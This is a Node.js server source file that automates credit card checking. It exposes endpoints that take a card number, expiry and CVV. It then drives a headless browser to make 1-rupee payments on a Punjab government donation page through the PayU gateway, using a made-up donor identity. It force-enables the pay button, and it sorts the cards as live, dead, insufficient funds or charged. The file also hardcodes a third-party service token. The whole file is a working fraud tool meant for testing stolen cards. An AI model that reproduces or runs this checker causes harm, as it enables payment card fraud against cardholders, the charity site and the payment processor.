const puppeteer = require('puppeteer-core');
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Error handling
process.on('uncaughtException', (err) => {
    console.error('[FATAL] Uncaught Exception:', err);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('[FATAL] Unhandled Rejection at:', promise, 'reason:', reason);
    process.exit(1);
});

// Startup logs
console.log('[*] ========================================');
console.log('[*] PayU Gateway API Starting...');
console.log('[*] ========================================');
console.log('[*] Node version:', process.version);
console.log('[*] Platform:', process.platform);
console.log('[*] Arch:', process.arch);
console.log('[*] PORT:', process.env.PORT || 3000);
console.log('[*] PUPPETEER_EXECUTABLE_PATH:', process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser');
console.log('[*] BROWSERLESS_TOKEN:', process.env.BROWSERLESS_TOKEN ? 'SET' : 'NOT SET');
console.log('[*] ========================================');

const SCREENSHOT_DIR = path.join(__dirname, 'screenshots');
if (!fs.existsSync(SCREENSHOT_DIR)) {
    fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });
    console.log('[*] Created screenshots directory');
}

// Browserless configuration
// Token with fallback for Render deployment
const BROWSERLESS_TOKEN = process.env.BROWSERLESS_TOKEN || '2TkYKbxsq8LjkUB165b3f401964c7b9dc4cbf240e69ed9f52';
const USE_BROWSERLESS = !!BROWSERLESS_TOKEN;

console.log('[*] Browserless mode:', USE_BROWSERLESS ? 'ENABLED' : 'DISABLED');

async function testCC(cc) {
    let browser;
    
    try {
        // Connect to Browserless or launch locally
        if (USE_BROWSERLESS) {
            console.log('[*] Connecting to Browserless...');
            try {
                browser = await puppeteer.connect({
                    browserWSEndpoint: `wss://chrome.browserless.io?token=${BROWSERLESS_TOKEN}`,
                    timeout: 30000
                });
                console.log('[*] Browserless connected successfully');
            } catch (browserlessError) {
                console.error('[ERROR] Browserless connection failed:', browserlessError.message);
                console.log('[*] Falling back to local Chromium...');
                // Fallback to local browser
                browser = await puppeteer.launch({
                    headless: 'new',
                    args: [
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-dev-shm-usage',
                        '--disable-gpu',
                        '--disable-software-rasterizer',
                        '--disable-extensions',
                    '--disable-background-networking',
                    '--disable-default-apps',
                    '--disable-sync',
                    '--disable-translate',
                    '--hide-scrollbars',
                    '--metrics-recording-only',
                    '--mute-audio',
                    '--no-first-run',
                    '--safebrowsing-disable-auto-update'
                ],
                executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser',
                timeout: 60000
                });
            }
        } else {
            console.log('[*] Launching local Chromium browser...');
            console.log('[*] Executable path:', process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser');
            browser = await puppeteer.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-extensions',
                    '--disable-background-networking',
                    '--single-process', // Important for Railway
                    '--no-zygote', // Important for Railway
                    '--disable-default-apps',
                    '--disable-sync',
                    '--disable-translate',
                    '--hide-scrollbars',
                    '--metrics-recording-only',
                    '--mute-audio',
                    '--no-first-run',
                    '--safebrowsing-disable-auto-update'
                ],
                executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser',
                timeout: 60000
            });
        }
        
        const page = await browser.newPage();
        await page.setViewport({width: 1280, height: 900});
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        
        const donorName = 'Rahul Sharma';
        const phone = '9' + String(Math.floor(100000000 + Math.random() * 900000000));
        const email = 'donor' + Date.now() + '@gmail.com';
        const pan = 'ABCDE1234F';
        
        console.log('[*] CC:', cc.number.slice(0,6) + '***' + cc.number.slice(-4));
        
        // Step 1: Load donation page
        console.log('[1] Loading donation page...');
        await page.goto('https://rangla.punjab.gov.in/', {waitUntil: 'networkidle2', timeout: 60000});
        
        // Step 2: Fill donation form
        console.log('[2] Filling donation form...');
        await page.waitForFunction(() => document.querySelector('#state')?.options.length > 1, {timeout: 30000});
        
        await page.select('#state', 'PUNJAB');
        await page.type('[name="nameI"]', donorName, {delay: 20});
        await page.type('[name="phoneI"]', phone, {delay: 20});
        await page.type('[name="amountI"]', '1', {delay: 20});
        await page.type('[name="emailI"]', email, {delay: 20});
        await page.type('[name="panI"]', pan, {delay: 20});
        
        // Step 3: Submit to PayU
        console.log('[3] Submitting to PayU...');
        await Promise.all([
            page.waitForNavigation({waitUntil: 'networkidle0', timeout: 60000}),
            page.click('button.enlarge-btn')
        ]);
        
        const url = await page.url();
        console.log('[4] PayU URL:', url);
        
        if (!url.includes('payu')) {
            await browser.close();
            return {status: 'ERROR', message: 'PayU not reached'};
        }
        
        await new Promise(r => setTimeout(r, 5000));
        
        // Step 5: Click Cards option
        console.log('[5] Clicking Cards option...');
        await page.evaluate(() => {
            const elements = document.querySelectorAll('li, div, span');
            for (const el of elements) {
                const text = el.textContent.toLowerCase().trim();
                if ((text === 'cards' || text.includes('credit') || text.includes('debit')) && text.length < 30) {
                    el.click();
                    break;
                }
            }
        });
        
        await new Promise(r => setTimeout(r, 5000));
        
        // Step 6: Fill card details
        console.log('[6] Filling card details...');
        
        try {
            await page.waitForSelector('#cardNumber', {timeout: 5000});
            await page.click('#cardNumber');
            await page.type('#cardNumber', cc.number, {delay: 40});
        } catch(e) {}
        
        await new Promise(r => setTimeout(r, 500));
        
        try {
            await page.click('#cardExpiry');
            await page.type('#cardExpiry', cc.month + cc.year.slice(-2), {delay: 40});
        } catch(e) {}
        
        await new Promise(r => setTimeout(r, 500));
        
        try {
            await page.click('#cardCvv');
            await page.type('#cardCvv', cc.cvv, {delay: 40});
        } catch(e) {}
        
        await new Promise(r => setTimeout(r, 500));
        
        try {
            await page.click('#cardOwnerName');
            await page.type('#cardOwnerName', 'RAHUL SHARMA', {delay: 40});
        } catch(e) {}
        
        await new Promise(r => setTimeout(r, 2000));
        console.log('[6.1] Card details filled');
        
        // Step 7: Click checkboxes
        console.log('[7] Clicking checkboxes...');
        await page.evaluate(() => {
            const userConsent = document.getElementById('userConsentCheckbox');
            if (userConsent && !userConsent.checked) userConsent.click();
            document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
                if (!cb.checked) cb.click();
            });
        });
        
        await new Promise(r => setTimeout(r, 2000));
        
        // Step 8: Click PAY button
        console.log('[8] Clicking Pay button...');
        
        try {
            const clicked = await page.evaluate(() => {
                const btns = document.querySelectorAll('button');
                for (const btn of btns) {
                    const t = btn.textContent.trim().toLowerCase();
                    if (t.startsWith('pay ') || t.includes('pay ₹') || t.includes('pay rs') || t.includes('pay rm')) {
                        btn.disabled = false;
                        btn.classList.remove('disabled');
                        btn.click();
                        return true;
                    }
                }
                for (const btn of btns) {
                    if (btn.textContent.toLowerCase().includes('proceed')) {
                        btn.disabled = false;
                        btn.click();
                        return true;
                    }
                }
                return false;
            });
            
            if (clicked) {
                console.log('[8.1] Pay button clicked, waiting for response...');
            }
        } catch (e) {
            console.log('[8.1] Pay button click error:', e.message);
        }
        
        // Wait for response
        console.log('[9] Waiting for bank response...');
        await new Promise(r => setTimeout(r, 3000));
        
        // Check page state
        let attempts = 0;
        let status = 'UNKNOWN', msg = 'Check Screenshot 📸';
        
        while (attempts < 45) {
            try {
                await new Promise(r => setTimeout(r, 1000));
                attempts++;
                
                const currentUrl = await page.url();
                const pageText = await page.evaluate(() => document.body.innerText.toLowerCase());
                
                // Bank redirect - check URL patterns
                if (!currentUrl.includes('payu')) {
                    // Check for specific bank error messages first
                    if (pageText.includes('transaction failed') || pageText.includes('payment failed') ||
                        pageText.includes('transaction declined') || pageText.includes('payment declined')) {
                        status = 'DECLINED'; msg = 'Transaction Failed ❌';
                        console.log('[9.1] Transaction failed');
                        break;
                    }
                    
                    // Check for card errors
                    if (pageText.includes('invalid card') || pageText.includes('card not valid') ||
                        pageText.includes('card number invalid') || pageText.includes('incorrect card')) {
                        status = 'DEAD'; msg = 'Invalid Card Number ❌';
                        console.log('[9.1] Invalid card detected');
                        break;
                    }
                    
                    if (pageText.includes('cvv') && (pageText.includes('invalid') || pageText.includes('incorrect'))) {
                        status = 'DEAD'; msg = 'Invalid CVV ❌';
                        console.log('[9.1] Invalid CVV detected');
                        break;
                    }
                    
                    if (pageText.includes('expired') || pageText.includes('expiry')) {
                        status = 'DEAD'; msg = 'Card Expired ❌';
                        console.log('[9.1] Card expired');
                        break;
                    }
                    
                    // Check for insufficient funds
                    if (pageText.includes('insufficient') || pageText.includes('not sufficient') ||
                        pageText.includes('low balance') || pageText.includes('do not honor')) {
                        status = 'CCN'; msg = 'Insufficient Funds 💰';
                        console.log('[9.1] Insufficient funds');
                        break;
                    }
                    
                    // Bank 3DS/OTP page
                    if (currentUrl.includes('3d') || currentUrl.includes('secure') || currentUrl.includes('challenge') ||
                        currentUrl.includes('acs') || currentUrl.includes('authentication') ||
                        pageText.includes('otp') || pageText.includes('one time password') ||
                        pageText.includes('enter otp') || pageText.includes('verify')) {
                        status = 'LIVE'; msg = '3D Secure / OTP Required 🔐';
                        console.log('[9.1] 3DS/OTP page detected');
                        break;
                    }
                    
                    // Success page
                    if (pageText.includes('success') || pageText.includes('thank you') || 
                        pageText.includes('payment received') || pageText.includes('payment successful')) {
                        status = 'CHARGED'; msg = '( Thanks for your purchase! ✅ )';
                        console.log('[9.1] Payment successful');
                        break;
                    }
                    
                    // Continue waiting for bank response
                    console.log('[9.1] Bank redirect detected, waiting for response...');
                    // Don't break - keep waiting for actual response
                }
                
                // Still on PayU - check for errors
                if (pageText.includes('invalid card') || pageText.includes('card number is invalid') ||
                    pageText.includes('card not valid') || pageText.includes('invalid card number')) {
                    status = 'DEAD'; msg = 'Invalid Card Number ❌';
                    console.log('[9.2] Invalid card on PayU');
                    break;
                }
                if (pageText.includes('invalid cvv') || pageText.includes('incorrect cvv') ||
                    pageText.includes('cvv is invalid')) {
                    status = 'DEAD'; msg = 'Invalid CVV ❌';
                    console.log('[9.2] Invalid CVV on PayU');
                    break;
                }
                if (pageText.includes('expired') || pageText.includes('card has expired') ||
                    pageText.includes('expiry date')) {
                    status = 'DEAD'; msg = 'Card Expired ❌';
                    console.log('[9.2] Card expired on PayU');
                    break;
                }
                if (pageText.includes('declined') || pageText.includes('transaction declined')) {
                    status = 'DECLINED'; msg = 'CARD_DECLINED';
                    console.log('[9.2] Card declined on PayU');
                    break;
                }
                if (pageText.includes('insufficient') || pageText.includes('do not honor') ||
                    pageText.includes('not sufficient funds')) {
                    status = 'CCN'; msg = 'Insufficient Funds 💰';
                    console.log('[9.2] Insufficient funds on PayU');
                    break;
                }
                
                // Check for generic errors
                if (pageText.includes('error') || pageText.includes('failed')) {
                    status = 'DECLINED'; msg = 'CARD_DECLINED';
                    console.log('[9.2] Generic error on PayU');
                    break;
                }
                
                if (attempts % 5 === 0) console.log('[9.3] Waiting...', attempts, 's');
                
            } catch (e) {
                console.log('[9.3] Navigation at', attempts, 's');
                await new Promise(r => setTimeout(r, 3000));
                break;
            }
        }
        
        // STEP 10: Final Status Check (NO SCREENSHOT)
        try {
            const finalUrl = await page.url();
            const pageText = await page.evaluate(() => document.body.innerText.toLowerCase());
            
            console.log('[10.1] Final URL:', finalUrl.substring(0, 80));
            console.log('[10.2] Page text sample:', pageText.substring(0, 200));
            
            // Final status check if still UNKNOWN
            if (status === 'UNKNOWN') {
                console.log('[10.3] Final check - status still unknown');
                
                // Check if redirected away from PayU
                if (!finalUrl.includes('payu')) {
                    // Check for errors first
                    if (pageText.includes('fail') || pageText.includes('decline') || pageText.includes('error')) {
                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                    } else if (pageText.includes('invalid') || pageText.includes('incorrect')) {
                        status = 'DEAD'; msg = 'Invalid Card Details ❌';
                    } else if (finalUrl.includes('3d') || finalUrl.includes('challenge') || finalUrl.includes('secure') ||
                        finalUrl.includes('bank') || finalUrl.includes('acs') ||
                        pageText.includes('otp') || pageText.includes('verify') || pageText.includes('authentication')) {
                        status = 'LIVE'; msg = '3D Secure Required 🔐';
                    } else if (pageText.includes('success') || pageText.includes('thank')) {
                        status = 'CHARGED'; msg = '( Thanks for your purchase! ✅ )';
                    } else {
                        // Redirected but unclear - likely declined
                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                    }
                } else {
                    // Still on PayU
                    if (pageText.includes('invalid') || pageText.includes('incorrect')) {
                        status = 'DEAD'; msg = 'Invalid Card ❌';
                    } else if (pageText.includes('decline') || pageText.includes('error')) {
                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                    } else {
                        // No clear response - likely declined
                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                    }
                }
            }
            
            // NO SCREENSHOT - just return result
            console.log('[RESULT]', status, '-', msg);
            
            await browser.close();
            return { status, message: msg, bin: cc.number.slice(0,6), screenshot: null };
            
        } catch (e) {
            console.log('[10] Final check error:', e.message);
            await browser.close();
            return { status: status || 'DECLINED', message: msg || 'Error ❌', bin: cc.number.slice(0,6), screenshot: null };
        }
        
    } catch (e) {
        console.log('[ERROR]', e.message);
        if (browser) await browser.close();
        return { status: 'ERROR', message: e.message.substring(0, 100), screenshot: null };
    }
}

app.use(express.json());
app.use('/screenshots', express.static(SCREENSHOT_DIR));

// POST endpoint for /check
app.post('/check', async (req, res) => {
    const { cc, mm, yyyy, cvv } = req.body;
    if (!cc || !mm || !yyyy || !cvv) {
        return res.json({status: 'ERROR', message: 'Missing parameters'});
    }
    const result = await testCC({number: cc, month: mm, year: yyyy, cvv: cvv});
    res.json(result);
});

// GET endpoint for /payu (backward compatibility)
app.get('/payu', async (req, res) => {
    const cc = req.query.cc;
    if (!cc || !cc.includes('|')) return res.json({status: 'error', message: 'Format: cc=num|mm|yy|cvv'});
    const [number, month, year, cvv] = cc.split('|');
    res.json(await testCC({number, month, year, cvv}));
});

app.get('/', (req, res) => res.json({
    status: 'online',
    version: 'v9',
    endpoints: {
        check: 'POST /check',
        payu: 'GET /payu?cc=num|mm|yy|cvv'
    }
}));

app.get('/health', (req, res) => res.json({status: 'ok', timestamp: Date.now()}));

const PORT = process.env.PORT || 3000;

app.listen(PORT, '0.0.0.0', () => {
    console.log('[*] ========================================');
    console.log(`[*] ✅ PayU Checker v9 ONLINE`);
    console.log(`[*] 🌐 Server listening on port ${PORT}`);
    console.log(`[*] 🔗 Health: http://localhost:${PORT}/health`);
    console.log(`[*] 🔗 Check: POST http://localhost:${PORT}/check`);
    console.log('[*] ========================================');
}).on('error', (err) => {
    console.error('[FATAL] Server failed to start:', err);
    process.exit(1);
});
